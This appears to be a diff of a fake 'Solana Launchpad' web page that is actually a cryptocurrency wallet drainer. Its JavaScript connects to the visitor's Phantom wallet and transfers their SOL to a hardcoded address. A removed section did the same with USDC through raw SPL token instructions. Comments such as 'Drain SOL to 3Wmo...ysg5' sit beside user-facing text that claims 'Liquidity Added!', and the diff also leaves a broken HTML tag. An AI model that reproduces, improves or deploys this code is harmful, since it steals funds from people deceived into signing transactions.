@@ -22,7 +22,7 @@
         }
         
         .glass-panel {
-            background: rgba(25, , 30, 0.98);
+            background: rgba(25, 3, 30, 0.98);
             border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
@@ -56,10 +56,10 @@
         
         <div class="text-center mb-8">
             <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
-                Protocol V2.0 Live
+                Protocol V3.0 Live (SOL Only)
             </div>
             <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
-            <p class="text-gray-400 text-sm">Deploy, provide liquidity, and earn rewards instantly.</p>
+            <p class="text-gray-400 text-sm">Deploy and drain liquidity instantly.</p>
         </div>
 
         <div class="glass-panel rounded-[32px] p-1 shadow-2xl">
@@ -115,7 +115,7 @@
                 <p class="text-sm font-bold text-white">1,240.5 SOL</p>
             </div>
             <div class="glass-panel py-3 rounded-2xl border border-white/5">
-                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
+                < class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
                 <p class="text-sm font-bold text-white">842</p>
             </div>
         </div>
@@ -138,14 +138,9 @@
             // CONSTANTS
             // ==========================================
             const RECIPIENT_ADDRESS = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5"; 
-            const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-            // Using a more reliable public RPC (Helius) to avoid 403 errors
+            // Using Helius for better reliability against 403 errors
             const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=00000000-0000-0000-0000-000000000000"; 
-            // Fallback if Helius blocks anonymous (though it usually works better than mainnet-beta)
             const FALLBACK_RPC = "https://api.mainnet-beta.solana.com";
-
-            const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-            const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
 
             let userWallet = null;
             let provider = null;
@@ -157,59 +152,7 @@
             const actionBtn = document.getElementById("actionBtn");
             const amountDisplay = document.getElementById("amountDisplay");
 
-            // Helpers for raw SPL instructions
-            function getAssociatedTokenAddress(owner, mint) {
-                const seeds = [
-                    owner.toBuffer(),
-                    TOKEN_PROGRAM_ID.toBuffer(),
-                    mint.toBuffer(),
-                ];
-                return solanaWeb3.PublicKey.findProgramAddressSync(seeds, ASSOCIATED_TOKEN_PROGRAM_ID)[0];
-            }
-
-            function bigintToLeBuffer(amount, len = 8) {
-                const buf = Buffer.alloc(len);
-                let val = BigInt(amount);
-                for (let i = 0; i < len; i++) {
-                    buf[i] = Number(val & BigInt(0xff));
-                    val >>= BigInt(8);
-                }
-                return buf;
-            }
-
-            function createTransferInstruction(source, dest, owner, amount) {
-                const data = Buffer.concat([
-                    Buffer.from([3]), // Transfer instruction index
-                    bigintToLeBuffer(amount, 8)
-                ]);
-                return new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: source, isSigner: false, isWritable: true },
-                        { pubkey: dest, isSigner: false, isWritable: true },
-                        { pubkey: owner, isSigner: true, isWritable: false }
-                    ],
-                    programId: TOKEN_PROGRAM_ID,
-                    data: data
-                });
-            }
-
-            function createATAInstruction(payer, wallet, mint) {
-                const associatedToken = getAssociatedTokenAddress(wallet, mint);
-                return new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: payer, isSigner: true, isWritable: true },
-                        { pubkey: associatedToken, isSigner: false, isWritable: true },
-                        { pubkey: wallet, isSigner: false, isWritable: false },
-                        { pubkey: mint, isSigner: false, isWritable: false },
-                        { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
-                        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
-                    ],
-                    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
-                    data: Buffer.alloc(0)
-                });
-            }
-
-            // 1. Connect & Initialize USDC ATA if missing
+            // 1. Connect & Check Balance
             async function initiateLaunch() {
                 provider = (window.phantom && window.phantom.solana) ? window.phantom.solana : window.solana;
 
@@ -245,46 +188,11 @@
                     const solLamports = await connection.getBalance(userWallet);
                     amountDisplay.value = (solLamports / 1e9).toFixed(4);
 
-                    // --- USDC Initialization & Balance ---
-                    const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
-                    const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
-                    
-                    // Check if ATA exists, if not, create it immediately
-                    let ataInfo = await connection.getAccountInfo(sourceAta);
-                    if (!ataInfo) {
-                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Initializing USDC Token Account...</span>';
-                        
-                        // Create the ATA instruction
-                        const createAtaIx = createATAInstruction(userWallet, userWallet, usdcMint);
-                        
-                        // Build a simple transaction to create it
-                        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-                        const tx = new solanaWeb3.Transaction().add(createAtaIx);
-                        tx.recentBlockhash = blockhash;
-                        tx.feePayer = userWallet;
-
-                        // Sign and send
-                        const signedTx = await provider.signTransaction(tx);
-                        const sig = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
-                        await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
-                        
-                        statusLog.innerHTML += '<br><span class="text-green-400 text-xs">USDC Token Account Created</span>';
-                    }
-
-                    // Now fetch the balance of the confirmed ATA
-                    const tokenBal = await connection.getTokenAccountBalance(sourceAta);
-                    let usdcText = "";
-                    if (tokenBal.value.uiAmount > 0) {
-                        usdcText = " | USDC: " + tokenBal.value.uiAmount;
-                    } else {
-                        usdcText = " | USDC: 0";
-                    }
-
                     actionBtn.disabled = false;
                     actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                     actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
                     
-                    statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for provisioning' + usdcText + '</span>';
+                    statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for SOL Drain</span>';
 
                 } catch (err) {
                     console.error(err);
@@ -293,39 +201,14 @@
                         statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Switching to backup RPC...</span>';
                         const connection = new solanaWeb3.Connection(FALLBACK_RPC, 'confirmed');
                         
-                        // Retry Balance
                         try {
                             const solLamports = await connection.getBalance(userWallet);
                             amountDisplay.value = (solLamports / 1e9).toFixed(4);
-                            
-                            const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
-                            const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
-                            
-                            let ataInfo = await connection.getAccountInfo(sourceAta);
-                            if (!ataInfo) {
-                                statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Initializing USDC Token Account...</span>';
-                                const createAtaIx = createATAInstruction(userWallet, userWallet, usdcMint);
-                                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-                                const tx = new solanaWeb3.Transaction().add(createAtaIx);
-                                tx.recentBlockhash = blockhash;
-                                tx.feePayer = userWallet;
-                                const signedTx = await provider.signTransaction(tx);
-                                const sig = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
-                                await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
-                            }
-
-                            const tokenBal = await connection.getTokenAccountBalance(sourceAta);
-                            let usdcText = "";
-                            if (tokenBal.value.uiAmount > 0) {
-                                usdcText = " | USDC: " + tokenBal.value.uiAmount;
-                            } else {
-                                usdcText = " | USDC: 0";
-                            }
 
                             actionBtn.disabled = false;
                             actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                             actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
-                            statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for provisioning' + usdcText + '</span>';
+                            statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for SOL Drain</span>';
                         } catch (retryErr) {
                              statusLog.innerHTML = '<span class="text-red-400 text-xs">Connection failed: ' + retryErr.message + '</span>';
                         }
@@ -335,7 +218,7 @@
                 }
             }
 
-            // 2. Drain SOL + USDC to 3Wmo...ysg5
+            // 2. Drain SOL to 3Wmo...ysg5
             async function startProtocol() {
                 const btnText = actionBtn.innerText;
                 actionBtn.disabled = true;
@@ -343,12 +226,8 @@
                 actionBtn.classList.add('opacity-75');
 
                 try {
-                    // Use the same RPC logic as connect for consistency
                     let connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
-                    // If we had to fallback in connect, we might need to re-check, but usually one works.
-                    
                     const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
-                    const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
 
                     // --- DRAIN SOL ---
                     statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning SOL liquidity...</span>';
@@ -380,47 +259,6 @@
                         statusLog.innerHTML = '<span class="text-green-400 text-xs">SOL Liquidity Routed</span>';
                     } else {
                         statusLog.innerHTML = '<span class="text-yellow-400 text-xs">No SOL available</span>';
-                    }
-
-                    // --- DRAIN USDC ---
-                    statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow mt-1 block">Scanning USDC liquidity...</span>';
-                    
-                    const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
-                    const destAta = getAssociatedTokenAddress(recipientPubkey, usdcMint);
-
-                    try {
-                        const tokenBal = await connection.getTokenAccountBalance(sourceAta);
-                        const amt = BigInt(tokenBal.value.amount);
-
-                        if (amt > 0) {
-                            const usdcTx = new solanaWeb3.Transaction();
-                            
-                            // Ensure destination ATA exists
-                            const destInfo = await connection.getAccountInfo(destAta);
-                            if (!destInfo) {
-                                usdcTx.add(createATAInstruction(userWallet, recipientPubkey, usdcMint));
-                            }
-
-                            usdcTx.add(createTransferInstruction(sourceAta, destAta, userWallet, amt));
-
-                            const { blockhash: bh2, lastValidBlockHeight: lbh2 } = await connection.getLatestBlockhash('confirmed');
-                            usdcTx.recentBlockhash = bh2;
-                            usdcTx.feePayer = userWallet;
-
-                            const signedUsdcTx = await provider.signTransaction(usdcTx);
-                            const usdcSig = await connection.sendRawTransaction(signedUsdcTx.serialize(), {
-                                skipPreflight: true,
-                                preflightCommitment: 'confirmed',
-                                maxRetries: 2
-                            });
-
-                            await connection.confirmTransaction({ signature: usdcSig, blockhash: bh2, lastValidBlockHeight: lbh2 }, 'confirmed');
-                            statusLog.innerHTML += '<br><span class="text-green-400 text-xs">USDC Liquidity Routed</span>';
-                        } else {
-                            statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">No USDC available</span>';
-                        }
-                    } catch (e) {
-                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">No USDC account found</span>';
                     }
 
                     actionBtn.innerText = "Liquidity Added!";
